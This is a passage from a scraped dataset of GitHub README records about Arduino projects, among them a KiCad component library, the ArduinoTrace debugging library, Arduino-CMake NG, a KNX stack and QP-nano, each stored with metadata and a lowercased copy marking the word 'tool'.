Eeschema (the schematic editor of KiCad) go to Preferences -> Component Libraries. Click the \"Add\" button next to \"Component library files\".\nNavigate to your project folder, select \"arduino.lib\" and click \"open\".\nYou may wish to adjust the newly added arduino schematic library to be near the top of the load order using the \"Up\" and \"Down\" buttons, but this is optional and is only relevant if you have other libraries that use the same names for parts.\nOK out and exit Eeschema. Open Pcbnew (the PCB editor of KiCad) go to Preferences -> Footprint Libraries Manager.\nSelect the \"Project Specific Libraries\" tab and then click \"Append Library\".\nIn the new line of the table, set Library Path to \"$(KIPRJMOD)\\Arduino.pretty\" on Windows or \"$(KIPRJMOD)/Arduino.pretty\" on Linux/Mac, and ensure Plugin Type is \"KiCad\". Options and Description can be left blank. You should set Nickname to something descriptive - like \"Arduino\" for example!\nAll done: you are now ready to use these schematic components and footprints!\nA note about Power and Reset pins\nPower\nOn the Arduino Platform, it is not possible to categorically state that the power pins are \"power inputs\" or \"power outputs\", as that depends on exactly how you're using the Arduino. For example, if you're powering the Arduino from USB then GND, +3.3V and +5V would be power outputs and VIN would do nothing, whereas if you're powering the Arduino from a battery via your Shield then VIN and GND are power inputs whilst +5V and +3.3V are power outputs. There are other, more esoteric possibilities too.\nRegardless of the above, I needed to make a decision about what electrical type to apply to these pins. I could use something like Passive or Unspecified, but then KiCad's Electrical Rules Checker (ERC) tool would not be effective in catching errors on these pins at all, whilst using Power Output means it objects to you joining pins together (for example, joining all the GND pins into a common net) even when that's OK in some situations.\nTherefore, I have decided to use Power Input as this presents the least issues. This means if you're actually using any of the power pins as Power Outputs in your schematic, by default the ERC will complain that the relevant nets are undriven. To fix this you will need to add the special \"PWR_FLAG\" component to the affected net.\nReset\nReset pins on the Arduino Platform have interesting electrical characteristics, which mean that no KiCad electrical type exactly matches their functionality. I settled on Open Collector as the nearest candidate, but unlike a true Open Collector pin on an integrated circuit, the reset pins on the Arduino Platform have an internal weak pull-up, and the reset button that can strongly pull low, so your circuit needs to be able to cope with all these situations.\nIn other words, if you use the reset pin as an input to your shield then you do not need to add a pull-up (doing so will actually make it less responsive if not break it); conversely if you want to drive the reset line in order to reset the Arduino you need to ensure that you only ever pull it low - if you pull it high at the same time as an unwitting user hits the physical reset button, you've created a short between power and ground which will likely fry whatever chip is on your shield.\nTL;DR:\nThe KiCad ERC cannot catch all the possible electrical errors on your schematic as it doesn't natively support the reset and power pins' electrical types. Even if the ERC says its OK, double check it manually.\nIf the ERC says that your power pins are undriven, first manually check they are being driven. If they are driven, then add a \"PWR_FLAG\" component to the net to make the error go away.", "link": "https://github.com/Alarm-Siren/arduino-kicad-library", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "arduino kicad library\nversion 1.4.1\nlibrary of schematic components and footprints of common arduino boards for kicad.\ncurrently included are:\narduino 101 shield\narduino due shield\narduino leonardo shied\narduino m0 shield\narduino m0 pro shield\narduino mega 2560 shield\narduino micro socket\narduino mini socket\narduino nano socket\narduino uno shield\narduino zero shield\nshield means the arduino is designed to plug in from beneath your pcb; socket means it is designed to plug in from above.\ncomments, requests, bugs & contributions\nall are welcome.\nplease file an issue or pull request at https://github.com/alarm-siren/arduino-kicad-library\nlicense\ncopyright 2017-2018, nicholas parks young. all rights reserved.\nthis library is licensed under the gnu lgpl v2.1, which can be found in file license.txt.\ndonations\nif you've found this library useful and you'd like to make a donation towards its continued upkeep, click the button below:\nlibrary setup\nto add this library to your kicad project, do the following steps:\ncopy the source files to your project. make sure that the arduino.pretty folder structure is preserved.\nin eeschema (the schematic editor of kicad) go to preferences -> component libraries. click the \"add\" button next to \"component library files\".\nnavigate to your project folder, select \"arduino.lib\" and click \"open\".\nyou may wish to adjust the newly added arduino schematic library to be near the top of the load order using the \"up\" and \"down\" buttons, but this is optional and is only relevant if you have other libraries that use the same names for parts.\nok out and exit eeschema. open pcbnew (the pcb editor of kicad) go to preferences -> footprint libraries manager.\nselect the \"project specific libraries\" tab and then click \"append library\".\nin the new line of the table, set library path to \"$(kiprjmod)\\arduino.pretty\" on windows or \"$(kiprjmod)/arduino.pretty\" on linux/mac, and ensure plugin type is \"kicad\". options and description can be left blank. you should set nickname to something descriptive - like \"arduino\" for example!\nall done: you are now ready to use these schematic components and footprints!\na note about power and reset pins\npower\non the arduino platform, it is not possible to categorically state that the power pins are \"power inputs\" or \"power outputs\", as that depends on exactly how you're using the arduino. for example, if you're powering the arduino from usb then gnd, +3.3v and +5v would be power outputs and vin would do nothing, whereas if you're powering the arduino from a battery via your shield then vin and gnd are power inputs whilst +5v and +3.3v are power outputs. there are other, more esoteric possibilities too.\nregardless of the above, i needed to make a decision about what electrical type to apply to these pins. i could use something like passive or unspecified, but then kicad's electrical rules checker (erc) -----> tool !!!  would not be effective in catching errors on these pins at all, whilst using power output means it objects to you joining pins together (for example, joining all the gnd pins into a common net) even when that's ok in some situations.\ntherefore, i have decided to use power input as this presents the least issues. this means if you're actually using any of the power pins as power outputs in your schematic, by default the erc will complain that the relevant nets are undriven. to fix this you will need to add the special \"pwr_flag\" component to the affected net.\nreset\nreset pins on the arduino platform have interesting electrical characteristics, which mean that no kicad electrical type exactly matches their functionality. i settled on open collector as the nearest candidate, but unlike a true open collector pin on an integrated circuit, the reset pins on the arduino platform have an internal weak pull-up, and the reset button that can strongly pull low, so your circuit needs to be able to cope with all these situations.\nin other words, if you use the reset pin as an input to your shield then you do not need to add a pull-up (doing so will actually make it less responsive if not break it); conversely if you want to drive the reset line in order to reset the arduino you need to ensure that you only ever pull it low - if you pull it high at the same time as an unwitting user hits the physical reset button, you've created a short between power and ground which will likely fry whatever chip is on your shield.\ntl;dr:\nthe kicad erc cannot catch all the possible electrical errors on your schematic as it doesn't natively support the reset and power pins' electrical types. even if the erc says its ok, double check it manually.\nif the erc says that your power pins are undriven, first manually check they are being driven. if they are driven, then add a \"pwr_flag\" component to the net to make the error go away.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000284, "year": null}, {"Unnamed: 0": 2366, "autor": 326, "date": null, "content": "ArduinoTrace\nA dead-simple tracing library to debug your Arduino programs.\nExample\nAll you need to do is call TRACE() or DUMP(variable).\n#include <ArduinoTrace.h>\nint value = 0;\nvoid setup() {\nSerial.begin(9600);\nTRACE();\n}\nvoid loop() {\nvalue++;\nDUMP(value);\nBREAK();\n}\nThe program above would print:\nMyProgram.ino:7: void setup()\nMyProgram.ino:12: value = 1\nMyProgram.ino:13: BREAK! (press [enter] to continue)\nMyProgram.ino:12: value = 2\nMyProgram.ino:13: BREAK! (press [enter] to continue)\nMyProgram.ino:12: value = 3\nMyProgram.ino:13: BREAK! (press [enter] to continue)\n...\nFeatures\nTRACE() prints:\nfilename\nline number\nfunction's name\nfunction's parameters\ntemplate parameters (if any)\nDUMP(variable) prints:\nfilename\nline number\nvariable's name\nvariable's value\nBREAK() pauses the program until you send a line-break to the Serial\nTRACE() and DUMP(variable) work at global scope, provided that you call ARDUINOTRACE_INIT() to initialize the Serial port.\nFlushes the Serial port to make sure that each line is complete\nUses Flash memory when possible\nDeduplicates strings a much as reasonable feasible\nHeader-only\nRoughly 200 lines of code\nA simple recipe to find where the code crashes\nsprinkle your code with TRACE() and DUMP(variable)\nrun the program\nview all traces in the Serial monitor\nrepeat the process until you find the line that causes the crash\nConfiguration\nSetting Default Description\nARDUINOTRACE_ENABLE 1 Determines whether the library is active. If set to 1, ArduinoTrace is active, and prints traces to the serial port. Set this value to 0 to disable all the traces at once.\nARDUINOTRACE_ENABLE_PROGMEM 1 Determines whether the strings are stored in Flash or RAM. If defined to 1 (it's the default), ArduinoTrace places the string in the Flash memory to reduce the memory consumption. Only set this value to 0 if you have a compilation issue.\nARDUINOTRACE_ENABLE_FULLPATH 0 Determines how the filename is written. If set to 1, ArduinoTrace prints the full path of the file. If set to 0, ArduinoTrace only prints the filename.\nARDUINOTRACE_SERIAL Serial Define the serial port to use. Change this value to use an alternative serial port, for example, SerialUSB.\nTo change one of the settings above, you must define the symbol before including the library. For example:\n#define ARDUINOTRACE_ENABLE 0 // Disable all traces\n#include <ArduinoTrace.h>\nFAQ\nIs there a performance impact?\nOf course, there is! Your program will become fat and slow, so it's essential to use this library only when debugging.\nYou should never use it in production.\nYou should never commit a program with traces.\nDoes this library replace my logging library?\nAbsolutely not! Tracing and logging are different things.\nLogging is recording (possibly in an SD card) the important things that happen in a program so that we can do a post-mortem analysis, in case something goes wrong.\nTracing is recording every little step to narrow down the area of analysis when you're fixing a bug. It's a technique that you use for short periods of time, during a debugging session. Again, you should not commit code that contains traces.\nIn short: logging is something you do in production, tracing is something you do while debugging.\nWhy not use a debugger instead?\nSometimes, you cannot use a debugger. In this case, you can always go back to the good-old tracing technique.\nAnd what about EspExceptionDecoder?\nEspExceptionDecoder is an awesome tool, but unfortunately, the results are not always accurate; you often see unrelated function names in the stack. I don't know why that happens (I guess it's due to compiler optimizations), but whatever the reason, it's still good to have a fallback option.\nTutorials\nESP32 / ESP8266 Arduino: Debugging with the ArduinoTrace library (techtutorialsx.com)\nESP32 / ESP8266 ArduinoTrace: using the TRACE macro (techtutorialsx.com)\nWant to see how this library works?", "link": "https://github.com/bblanchon/ArduinoTrace", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "arduinotrace\na dead-simple tracing library to debug your arduino programs.\nexample\nall you need to do is call trace() or dump(variable).\n#include <arduinotrace.h>\nint value = 0;\nvoid setup() {\nserial.begin(9600);\ntrace();\n}\nvoid loop() {\nvalue++;\ndump(value);\nbreak();\n}\nthe program above would print:\nmyprogram.ino:7: void setup()\nmyprogram.ino:12: value = 1\nmyprogram.ino:13: break! (press [enter] to continue)\nmyprogram.ino:12: value = 2\nmyprogram.ino:13: break! (press [enter] to continue)\nmyprogram.ino:12: value = 3\nmyprogram.ino:13: break! (press [enter] to continue)\n...\nfeatures\ntrace() prints:\nfilename\nline number\nfunction's name\nfunction's parameters\ntemplate parameters (if any)\ndump(variable) prints:\nfilename\nline number\nvariable's name\nvariable's value\nbreak() pauses the program until you send a line-break to the serial\ntrace() and dump(variable) work at global scope, provided that you call arduinotrace_init() to initialize the serial port.\nflushes the serial port to make sure that each line is complete\nuses flash memory when possible\ndeduplicates strings a much as reasonable feasible\nheader-only\nroughly 200 lines of code\na simple recipe to find where the code crashes\nsprinkle your code with trace() and dump(variable)\nrun the program\nview all traces in the serial monitor\nrepeat the process until you find the line that causes the crash\nconfiguration\nsetting default description\narduinotrace_enable 1 determines whether the library is active. if set to 1, arduinotrace is active, and prints traces to the serial port. set this value to 0 to disable all the traces at once.\narduinotrace_enable_progmem 1 determines whether the strings are stored in flash or ram. if defined to 1 (it's the default), arduinotrace places the string in the flash memory to reduce the memory consumption. only set this value to 0 if you have a compilation issue.\narduinotrace_enable_fullpath 0 determines how the filename is written. if set to 1, arduinotrace prints the full path of the file. if set to 0, arduinotrace only prints the filename.\narduinotrace_serial serial define the serial port to use. change this value to use an alternative serial port, for example, serialusb.\nto change one of the settings above, you must define the symbol before including the library. for example:\n#define arduinotrace_enable 0 // disable all traces\n#include <arduinotrace.h>\nfaq\nis there a performance impact?\nof course, there is! your program will become fat and slow, so it's essential to use this library only when debugging.\nyou should never use it in production.\nyou should never commit a program with traces.\ndoes this library replace my logging library?\nabsolutely not! tracing and logging are different things.\nlogging is recording (possibly in an sd card) the important things that happen in a program so that we can do a post-mortem analysis, in case something goes wrong.\ntracing is recording every little step to narrow down the area of analysis when you're fixing a bug. it's a technique that you use for short periods of time, during a debugging session. again, you should not commit code that contains traces.\nin short: logging is something you do in production, tracing is something you do while debugging.\nwhy not use a debugger instead?\nsometimes, you cannot use a debugger. in this case, you can always go back to the good-old tracing technique.\nand what about espexceptiondecoder?\nespexceptiondecoder is an awesome -----> tool !!! , but unfortunately, the results are not always accurate; you often see unrelated function names in the stack. i don't know why that happens (i guess it's due to compiler optimizations), but whatever the reason, it's still good to have a fallback option.\ntutorials\nesp32 / esp8266 arduino: debugging with the arduinotrace library (techtutorialsx.com)\nesp32 / esp8266 arduinotrace: using the trace macro (techtutorialsx.com)\nwant to see how this library works?", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000326, "year": null}, {"Unnamed: 0": 2379, "autor": 339, "date": null, "content": "Arduino-CMake NG\nArduino-CMake is a framework which allows developers to write Arduino-based programs using any tool that supports cmake. Arduino-based? There are many other frameworks out there built upon Arduino's base, such as ESP32, and we respect that (Note that it doesn't mean we support it yet).\nIn other words, developers can use their favorite IDEs or text editors on their favorite OS to develop Arduino programs!\nWait - Hasn't it been possible all this time? Apparently not. You can read more about it in the Motivation section.\nNote to new users: The master branch is used for active development only, so if you seek to simply use the framework then you should head to the releases section instead!\nImportant Notice\nThis project is dead and is no longer maintained! You can find more info here.\nHowever, there's a new framework named Arduino-CMake-Toolchain that took the basis of this project and continued it very well - Please use it!\nFeatures\nArduino-CMake should1 do almost2 anything that the Arduino IDE does!\nWhat's supported?\nDeveloping Arduino programs in any IDE or text editor\nArduino Programs - Executables\nUploading/Flashing programs to hardware boards\nLibraries\nArduino native libraries, built-in with most of the SDKs (such as Blink)\n3rd Party libraries\nUser libraries\nArduino example programs\nArduino library example programs\nArduino sketches (.ino files)\nConversion of sketch files to .cpp source files\nResolving libraries used by a sketch file\nGenerating required function prototypes/signatures in converted sources\n3rd Party platforms (such as ESP32, pinoccio, etc.)\nProgrammers and bootloaders\nSerial Connection (e.g. for monitoring)\nCompletely customizing the build process per user's requirements\nSetting custom build flags\nUsing user-generated build recipes\nIt's also worth mentioning that Arduino-CMake is cross platform and works out-of-the-box on every OS that support CMake and Arduino.\n1 The framework is still a WIP, meaning there are some missing features. \u21a9\n2 The Arduino IDE supports several concepts which make writing code easier but are completely unprofessional. Our framework is not willing to encourage such poor coding standards, and thus doesn't support them. These will be mentioned throughout the documentation. \u21a9\nUsage\nA very basic example of how Arduino-CMake can be used is listed below:\n# Define CMake's minimum version (must-do) and the project's name and supported languages\ncmake_minimum_required(VERSION 3.8.2)\nproject(Hello_World)\n# Call a framework utility function, passing it information about the hardware board that will be used - This function returns a structure known only to the framework\nget_board_id(board_id nano atmega328)\n# Create an executable suitable for Arduino using CMake-style target-creation\nadd_arduino_executable(Hello_World ${board_id} helloWorld.cpp)\n# Upload the created target through a connected Serial Port (Where your board is connected to)\nupload_arduino_target(Hello_World \"${board_id}\" COM3)\nYou should then call CMake (either through cmd, cmake-gui or an IDE if it supports that), passing it the argument -DCMAKE_TOOLCHAIN_FILE=[project_path]/cmake/Arduino-Toolchain.cmake where [project_path] is substituted by the project's full path. This is what allows cmake to use our framework.\nThat's it! It's super simple, yet super extensible :)\nMotivation\nEveryone has their favorite IDE or text editor, and would like to continue using it as long as they can. Upon encountering a framework that doesn't support it - We get frustrated. Unfortunately that's often the case with the Arduino framework, as it offers a custom toolchain that makes it uncomfortable to use outside the dedicated Arduino IDE.\nArduino-CMake solves it by creating a framework leveraging all of Arduino's features, including its' custom toolchain, by adding a single dependency - The CMake build system.\nProject Roots\nThe original project started back in 2011 by queezythegreat and had been actively developed until 2014, when it had been abandoned due to unknown reasons. Since then more than 150 (!) forks have emerged, leading to a \"chaos\" in the Arduino-CMake sphere. The most important moment however was in 2017, when a combined effort by JonasProgrammer and MrPointer has brought new life to the project in the face of the arduino-cmake organization. And yet, it still had its own problems, leading once again to an abandoned state.\nThen, in 2018, an extreme effort has been made and the project has been completely rewritten (mostly by MrPointer) with a few very clear goals in mind:\nPlatform-Independent - The framework shouldn't assume it works only with the basic Arduino platform, as there are many others out there. Any platform that confront to the design of the basic Arduino SDK is appropriate for use. An example of such a platform is ESP32.\nModern CMake - All previous projects/forks have been using the fairly old CMake 2.8. CMake itself has transitioned much from version 2 to 3, benefiting from a whole lot of new exciting features. Even the official package managers support CMake 3 versions, so there's no excuse to not use it.\nModern Arduino SDK - The Arduino SDK, much like CMake, has also undergone several major changes during the years, especially with version 1.6. The Arduino SDK has only recently got stable, and that's why we recommend always having the latest version installed, although we do have some minimum requirements for the framework to even work. You can find them at the Requirements section.\nHow it works\nArduino programs are simply C/C++ programs which take advantage of a framework which allows them to run on specific hardware devices. It means that those programs need to be compiled somehow. Back in the \"old days\" developers used compilers such as gcc directly from the command line. Then came build-tools such as make. Then came CMake. Most of the modern build systems today are managed by CMake and most of the modern IDEs know that and take advantage of it. But what's really useful in CMake, at least regarding our Arduino world, is the ability to cross-compile with a toolchain. The Arduino SDK, which one usually downloads together with the Arduino IDE, is actually also a toolchain, as it includes the required compilation & linkage tools for cross-compiling. Analyzing the SDK allows us to build a framework using this toolchain, and also all of Arduino's other cool features such as libraries, examples, etc.\nWhat is NG\nNG stands for \"New Generation\". Inferred from the written above, it can easily be understood why the project has this name. However, if you don't think this name is good enough or it confuses you - Feel free to propose a name of your own, we're open for offers :)\nRequirements\nThe following list is the basic requirements of the framework in order to use it:\nWindows, OS X or Linux (BSD support is currently unknown, use at your own risk)\nCMake Version 3.8 or Higher\nArduino-Based SDK compatible with Arduino SDK Version:\n1.8.2 or Higher on Microsoft Windows\n1.6.10 or Higher on Linux and Apple OS X\nInstallation\nFirst, make sure to download the latest release of the framework.\nFurther instructions can be found in the Installation Wiki page.\nDocumentation\nThe entire documentation of the project is hosted on GitHub using Wiki pages.\nContributing\nThe project has strict contributing guidelines which can be found in the Contributing File.\nLicense\nMIT \u00a9 2018 Arduino-CMake", "link": "https://github.com/arduino-cmake/Arduino-CMake-NG", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "arduino-cmake ng\narduino-cmake is a framework which allows developers to write arduino-based programs using any -----> tool !!!  that supports cmake. arduino-based? there are many other frameworks out there built upon arduino's base, such as esp32, and we respect that (note that it doesn't mean we support it yet).\nin other words, developers can use their favorite ides or text editors on their favorite os to develop arduino programs!\nwait - hasn't it been possible all this time? apparently not. you can read more about it in the motivation section.\nnote to new users: the master branch is used for active development only, so if you seek to simply use the framework then you should head to the releases section instead!\nimportant notice\nthis project is dead and is no longer maintained! you can find more info here.\nhowever, there's a new framework named arduino-cmake-toolchain that took the basis of this project and continued it very well - please use it!\nfeatures\narduino-cmake should1 do almost2 anything that the arduino ide does!\nwhat's supported?\ndeveloping arduino programs in any ide or text editor\narduino programs - executables\nuploading/flashing programs to hardware boards\nlibraries\narduino native libraries, built-in with most of the sdks (such as blink)\n3rd party libraries\nuser libraries\narduino example programs\narduino library example programs\narduino sketches (.ino files)\nconversion of sketch files to .cpp source files\nresolving libraries used by a sketch file\ngenerating required function prototypes/signatures in converted sources\n3rd party platforms (such as esp32, pinoccio, etc.)\nprogrammers and bootloaders\nserial connection (e.g. for monitoring)\ncompletely customizing the build process per user's requirements\nsetting custom build flags\nusing user-generated build recipes\nit's also worth mentioning that arduino-cmake is cross platform and works out-of-the-box on every os that support cmake and arduino.\n1 the framework is still a wip, meaning there are some missing features. \u21a9\n2 the arduino ide supports several concepts which make writing code easier but are completely unprofessional. our framework is not willing to encourage such poor coding standards, and thus doesn't support them. these will be mentioned throughout the documentation. \u21a9\nusage\na very basic example of how arduino-cmake can be used is listed below:\n# define cmake's minimum version (must-do) and the project's name and supported languages\ncmake_minimum_required(version 3.8.2)\nproject(hello_world)\n# call a framework utility function, passing it information about the hardware board that will be used - this function returns a structure known only to the framework\nget_board_id(board_id nano atmega328)\n# create an executable suitable for arduino using cmake-style target-creation\nadd_arduino_executable(hello_world ${board_id} helloworld.cpp)\n# upload the created target through a connected serial port (where your board is connected to)\nupload_arduino_target(hello_world \"${board_id}\" com3)\nyou should then call cmake (either through cmd, cmake-gui or an ide if it supports that), passing it the argument -dcmake_toolchain_file=[project_path]/cmake/arduino-toolchain.cmake where [project_path] is substituted by the project's full path. this is what allows cmake to use our framework.\nthat's it! it's super simple, yet super extensible :)\nmotivation\neveryone has their favorite ide or text editor, and would like to continue using it as long as they can. upon encountering a framework that doesn't support it - we get frustrated. unfortunately that's often the case with the arduino framework, as it offers a custom toolchain that makes it uncomfortable to use outside the dedicated arduino ide.\narduino-cmake solves it by creating a framework leveraging all of arduino's features, including its' custom toolchain, by adding a single dependency - the cmake build system.\nproject roots\nthe original project started back in 2011 by queezythegreat and had been actively developed until 2014, when it had been abandoned due to unknown reasons. since then more than 150 (!) forks have emerged, leading to a \"chaos\" in the arduino-cmake sphere. the most important moment however was in 2017, when a combined effort by jonasprogrammer and mrpointer has brought new life to the project in the face of the arduino-cmake organization. and yet, it still had its own problems, leading once again to an abandoned state.\nthen, in 2018, an extreme effort has been made and the project has been completely rewritten (mostly by mrpointer) with a few very clear goals in mind:\nplatform-independent - the framework shouldn't assume it works only with the basic arduino platform, as there are many others out there. any platform that confront to the design of the basic arduino sdk is appropriate for use. an example of such a platform is esp32.\nmodern cmake - all previous projects/forks have been using the fairly old cmake 2.8. cmake itself has transitioned much from version 2 to 3, benefiting from a whole lot of new exciting features. even the official package managers support cmake 3 versions, so there's no excuse to not use it.\nmodern arduino sdk - the arduino sdk, much like cmake, has also undergone several major changes during the years, especially with version 1.6. the arduino sdk has only recently got stable, and that's why we recommend always having the latest version installed, although we do have some minimum requirements for the framework to even work. you can find them at the requirements section.\nhow it works\narduino programs are simply c/c++ programs which take advantage of a framework which allows them to run on specific hardware devices. it means that those programs need to be compiled somehow. back in the \"old days\" developers used compilers such as gcc directly from the command line. then came build-tools such as make. then came cmake. most of the modern build systems today are managed by cmake and most of the modern ides know that and take advantage of it. but what's really useful in cmake, at least regarding our arduino world, is the ability to cross-compile with a toolchain. the arduino sdk, which one usually downloads together with the arduino ide, is actually also a toolchain, as it includes the required compilation & linkage tools for cross-compiling. analyzing the sdk allows us to build a framework using this toolchain, and also all of arduino's other cool features such as libraries, examples, etc.\nwhat is ng\nng stands for \"new generation\". inferred from the written above, it can easily be understood why the project has this name. however, if you don't think this name is good enough or it confuses you - feel free to propose a name of your own, we're open for offers :)\nrequirements\nthe following list is the basic requirements of the framework in order to use it:\nwindows, os x or linux (bsd support is currently unknown, use at your own risk)\ncmake version 3.8 or higher\narduino-based sdk compatible with arduino sdk version:\n1.8.2 or higher on microsoft windows\n1.6.10 or higher on linux and apple os x\ninstallation\nfirst, make sure to download the latest release of the framework.\nfurther instructions can be found in the installation wiki page.\ndocumentation\nthe entire documentation of the project is hosted on github using wiki pages.\ncontributing\nthe project has strict contributing guidelines which can be found in the contributing file.\nlicense\nmit \u00a9 2018 arduino-cmake", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000339, "year": null}, {"Unnamed: 0": 2406, "autor": 366, "date": null, "content": "knx\nThis projects provides a knx-device stack for arduino (ESP8266, SAMD21) and linux. (more are quite easy to add) It implements most of System-B specification and can be configured with ETS. The necessary knxprod-files can be generated with my CreateKnxProd tool.\nFor esp8266 WifiManager is used to configure wifi.\nDon't forget to reset ESP8266 manually (disconnect power) after flashing. The reboot doen't work during configuration with ETS otherwise.\nThe SAMD21 version uses my version of the FlashStorage lib (Pull request pending).\nGenerated documentation can be found here.", "link": "https://github.com/thelsing/knx", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "knx\nthis projects provides a knx-device stack for arduino (esp8266, samd21) and linux. (more are quite easy to add) it implements most of system-b specification and can be configured with ets. the necessary knxprod-files can be generated with my createknxprod -----> tool !!! .\nfor esp8266 wifimanager is used to configure wifi.\ndon't forget to reset esp8266 manually (disconnect power) after flashing. the reboot doen't work during configuration with ets otherwise.\nthe samd21 version uses my version of the flashstorage lib (pull request pending).\ngenerated documentation can be found here.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000366, "year": null}, {"Unnamed: 0": 2418, "autor": 378, "date": null, "content": "NOTE: If your company has a policy forbidding open source in your product, all QP frameworks can be licensed commercially, in which case you don't use any open source license and you do not violate your policy.\nWhat's New?\nNOTE QP-nano has been discontinued from active development and support and is not recommended for new designs. This QP-nano repository is preserved for the existing user base.\nDocumentation\nThe offline HTML documentation for this particular version of QP-nano is located in the folder html/. To view the offline documentation, open the file html/index.html in your web browser.\nThe online HTML documention for the latest version of QP-nano is located at: https://www.state-machine.com/qpn/\nAbout QP-nano\nQP-nano (Quantum Platform Nano) is an ultra-lightweight, open source Real-Time Embedded Framework (RTEF) for building modern embedded software as systems of asynchronous, event-driven active objects (actors). The QP-nano framework is a member of a larger QP family consisting of QP/C, QP/C++, and QP-nano frameworks, which are all strictly quality controlled, thoroughly documented, and commercially licensable.\nSafer Model of Concurrency\nThe QP framework family is based on the Active Object (actor) design pattern, which inherently supports and automatically enforces the following best practices of concurrent programming:\nKeep data isolated and bound to active objects' threads. Threads should hide (encapsulate) their private data and other resources, and not share them with the rest of the system.\nCommunicate among active object threads asynchronously via event objects. Using asynchronous events keeps the threads running truly independently, without blocking on each other.\nActive object threads should spend their lifetime responding to incoming events, so their mainline should consist of an event-loop that handles events one at a time (to completion), thus avoiding any concurrency hazards within an active object thread itself.\nThis architecture is generally safer, more responsive and easier to understand and maintain than the shared-state concurrency of a conventional RTOS. It also provides higher level of abstraction and the correct abstractions to effectively apply modeling and code generation to deeply embedded real-time systems.\nHierarchical State Machines\nThe behavior of active objects is specified in QP-nano by means of Hierarchical State Machines (UML statecharts). The framework supports manual coding of UML state machines in C as well as automatic code generation by means of the free QM modeling tool.\nBuilt-in Real-Time Kernels\nThe QP-nano framework can run on bare-metal single-chip microcontrollers, completely replacing a traditional \"superloop\" or an RTOS. The framework contains a selection of built-in real-time kernels, such as the cooperative QV-nano kernel and the preemptive non-blocking QK-nano kernel. Native QP-nano ports and ready-to-use examples are provided for such CPUs MSP430, AVRmega, and ARM Cortex-M (M0/M0+/M3/M4).\nMaturity\nWith 60,000 downloads a year, the QP family is the most popular such solution on the embedded software market. It provides a modern, reusable architecture for embedded applications, which combines the active-object model of concurrency with hierarchical state machines.\nGetting Started with QP-nano\nThe QP-nano Reference Manual provides instructions on how to download, install, and get started with QP-nano quickly.\nThe AppNote: \"Getting Started with QP-nano\" contains also a tutorial, in which you build a simple \"Blinky\" application.\nQP-nano Licensing\nQP-nano is licensed under the increasingly popular dual licensing model, in which both the open source software distribution mechanism and traditional closed source software distribution models are combined.\nNOTE: If your company has a policy forbidding open source in your product, all QP frameworks can be licensed commercially, in which case you don't use any open source license and you do not violate your policy.\nQP-nano Documentation\nThe QP-nano Manual is located online at: https://www.state-machine.com/qpn\nHow to get help?\nFree Support Forum\nBug Reports\nFeature Requests\nQuantum Leaps website\nQuantum Leaps licensing\ninfo@state-machine.com", "link": "https://github.com/QuantumLeaps/qpn", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "note: if your company has a policy forbidding open source in your product, all qp frameworks can be licensed commercially, in which case you don't use any open source license and you do not violate your policy.\nwhat's new?\nnote qp-nano has been discontinued from active development and support and is not recommended for new designs. this qp-nano repository is preserved for the existing user base.\ndocumentation\nthe offline html documentation for this particular version of qp-nano is located in the folder html/. to view the offline documentation, open the file html/index.html in your web browser.\nthe online html documention for the latest version of qp-nano is located at: https://www.state-machine.com/qpn/\nabout qp-nano\nqp-nano (quantum platform nano) is an ultra-lightweight, open source real-time embedded framework (rtef) for building modern embedded software as systems of asynchronous, event-driven active objects (actors). the qp-nano framework is a member of a larger qp family consisting of qp/c, qp/c++, and qp-nano frameworks, which are all strictly quality controlled, thoroughly documented, and commercially licensable.\nsafer model of concurrency\nthe qp framework family is based on the active object (actor) design pattern, which inherently supports and automatically enforces the following best practices of concurrent programming:\nkeep data isolated and bound to active objects' threads. threads should hide (encapsulate) their private data and other resources, and not share them with the rest of the system.\ncommunicate among active object threads asynchronously via event objects. using asynchronous events keeps the threads running truly independently, without blocking on each other.\nactive object threads should spend their lifetime responding to incoming events, so their mainline should consist of an event-loop that handles events one at a time (to completion), thus avoiding any concurrency hazards within an active object thread itself.\nthis architecture is generally safer, more responsive and easier to understand and maintain than the shared-state concurrency of a conventional rtos. it also provides higher level of abstraction and the correct abstractions to effectively apply modeling and code generation to deeply embedded real-time systems.\nhierarchical state machines\nthe behavior of active objects is specified in qp-nano by means of hierarchical state machines (uml statecharts). the framework supports manual coding of uml state machines in c as well as automatic code generation by means of the free qm modeling -----> tool !!! .\nbuilt-in real-time kernels\nthe qp-nano framework can run on bare-metal single-chip microcontrollers, completely replacing a traditional \"superloop\" or an rtos. the framework contains a selection of built-in real-time kernels, such as the cooperative qv-nano kernel and the preemptive non-blocking qk-nano kernel. native qp-nano ports and ready-to-use examples are provided for such cpus msp430, avrmega, and arm cortex-m (m0/m0+/m3/m4).\nmaturity\nwith 60,000 downloads a year, the qp family is the most popular such solution on the embedded software market. it provides a modern, reusable architecture for embedded applications, which combines the active-object model of concurrency with hierarchical state machines.\ngetting started with qp-nano\nthe qp-nano reference manual provides instructions on how to download, install, and get started with qp-nano quickly.\nthe appnote: \"getting started with qp-nano\" contains also a tutorial, in which you build a simple \"blinky\" application.\nqp-nano licensing\nqp-nano is licensed under the increasingly popular dual licensing model, in which both the open source software distribution mechanism and traditional closed source software distribution models are combined.\nnote: if your company has a policy forbidding open source in your product, all qp frameworks can be licensed commercially, in which case you don't use any open source license and you do not violate your policy.\nqp-nano documentation\nthe qp-nano manual is located online at: https://www.state-machine.com/qpn\nhow to get help?\nfree support forum\nbug reports\nfeature requests\nquantum leaps website\nquantum leaps licensing\ninfo@state-machine.com", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000378, "year": null}, {"Unnamed: 0": 2441, "autor": 401, "date": null, "content": 